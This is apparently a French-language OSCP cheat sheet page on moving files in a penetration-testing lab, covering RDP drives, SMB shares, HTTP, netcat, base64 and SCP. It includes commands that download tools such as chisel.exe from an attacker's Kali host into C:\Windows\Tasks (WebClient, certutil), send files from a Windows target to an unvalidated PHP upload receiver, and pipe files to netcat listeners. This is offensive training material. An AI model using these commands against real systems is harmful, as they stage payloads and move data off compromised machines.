---
title: "OSCP · Transfert de fichiers"
description: "Envoyer, récupérer et encoder des fichiers dans un laboratoire."
---

# OSCP · Transfert de fichiers

Envoyer, récupérer et encoder des fichiers dans un laboratoire.


## Dossier partagé RDP


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop

```




```bash
rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_username]/Desktop

```


**Paramètres et repères :**
`lget` · `lput`  




```text
download [file_name] [optional_file_destination_path]

```




```text
upload [file_name] [optional_file_destination_path]

```


## FTP

Transférer des fichiers via FTP.


**Paramètres et repères :**
`binary`  


## SMB

Copier des fichiers via un partage SMB.


<p class="oscp-command-note">Commande Impacket dans la rubrique « SMB ».</p>

```bash
impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password

```


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```bash
net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password

```


## Requêtes HTTP

Transférer des fichiers avec des requêtes HTTP.


<p class="oscp-command-note">Exécuter un script Python.</p>

```powershell
python3 -m http.server 80

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')

```


<p class="oscp-command-note">Script shell dans la rubrique « Requêtes HTTP ».</p>

```bash
# Depuis PowerShell
(New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')

Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]

# Si iwr ne fonctionne pas
certutil -urlcache -split -f http://[kali_IP]/[file_to_download]

# Depuis CMD
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"

```


## Script PHP pour recevoir des fichiers depuis Windows

Recevoir des fichiers téléversés vers un script PHP.


**Paramètres et repères :**
`upload.php`  


<p class="oscp-command-note">Extrait PHP lié à « PHP Script (bring files from Windows) ».</p>

```php
<?php
  $uploaddir = '/var/www/uploads/';

  $uploadfile = $uploaddir . $_FILES['file']['name'];

  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

```


**Paramètres et repères :**
`var/www/uploads`  


<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod +x upload.php

sudo mkdir /var/www/uploads

mv upload.php /var/www/uploads

```




```bash
service apache2 start

ps -ef | grep apache

```


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')

```




```bash
service apache2 stop

```


## Netcat

Transférer un fichier via une connexion Netcat.


### Envoyer un fichier


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 > received_file.txt

# (facultatif) Si nous avons besoin de transférer les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
ncat --ssl -lvp 4444 > received_file.txt

```


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
nc <receiver_IP> 4444 < file_to_send.txt

# (facultatif) Si nous avons besoin de recevoir les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
ncat --ssl <receiver_IP> 4444 < file_to_send.txt

```


### Envoyer un fichier avec compression


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 | tar xzvf -

```




```bash
tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444

```


### Transfert Base64 par copier-coller

Encoder un fichier en Base64 puis le reconstruire sur la machine de destination.




```bash
# Ceci va imprimer la chaîne Base64 directement dans le terminal, que vous pouvez copier manuellement
base64 file_to_send.txt

```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Vous pouvez coller manuellement le contenu encodé Base64 dans un nouveau fichier
echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt

```


### Transfert de contenu Base64 via Netcat

Transférer du contenu encodé en Base64 via Netcat.


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 | base64 -d > received_file.txt

```




```bash
base64 file_to_send.txt | nc <receiver_IP> 4444

```


## Transferts via SMB et SCP

Choisir une méthode adaptée au protocole autorisé. Les exemples de serveurs temporaires doivent être arrêtés après les tests ; ne pas ouvrir de partage inutilement sur un réseau public.

### Partage SMB temporaire depuis Linux

Exposer un répertoire de laboratoire en SMB2 pour les opérations de copie autorisées.

<p class="oscp-command-note">Partage SMB temporaire depuis Linux.</p>

```bash
impacket-smbserver -smb2support partage "$(pwd)"
```

### Partage SMB avec compte de test

Protéger le partage temporaire par un compte dédié plutôt que le laisser accessible sans authentification.

<p class="oscp-command-note">Partage SMB avec compte de test.</p>

```bash
impacket-smbserver -smb2support -user <UTILISATEUR> -password '<MOT_DE_PASSE>' partage "$(pwd)"
```

### SCP en mode historique

Forcer le protocole SCP historique lorsque le serveur distant ne prend pas en charge SFTP. L'option -O n'est pas nécessaire pour les serveurs modernes.

<p class="oscp-command-note">SCP en mode historique.</p>

```bash
scp -O <FICHIER_LOCAL> <UTILISATEUR>@<HOTE_SSH>:<CHEMIN_DISTANT>
```

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/index.md). Présentation rédigée pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
